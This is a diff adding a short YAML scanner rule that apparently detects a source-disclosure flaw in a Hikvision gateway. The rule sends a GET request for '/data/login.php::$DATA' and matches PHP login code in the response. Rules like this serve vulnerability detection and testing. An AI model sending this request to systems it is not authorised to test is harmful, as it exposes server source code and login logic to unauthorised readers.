@@ -1,0 +1,10 @@
+cve-id: hikvision-gateway-data-fileread
+rules:
+ -  method: GET
+    path: /data/login.php::$DATA
+    expression: |
+      response.status == 200 && response.body.bcontains(b'DataBaseQuery();') && response.body.bcontains(b'$_POST[\'userName\'];') && response.body.bcontains(b'$_POST[\'password\'];')
+severity:
+  critical
+type: 
+  authbypass
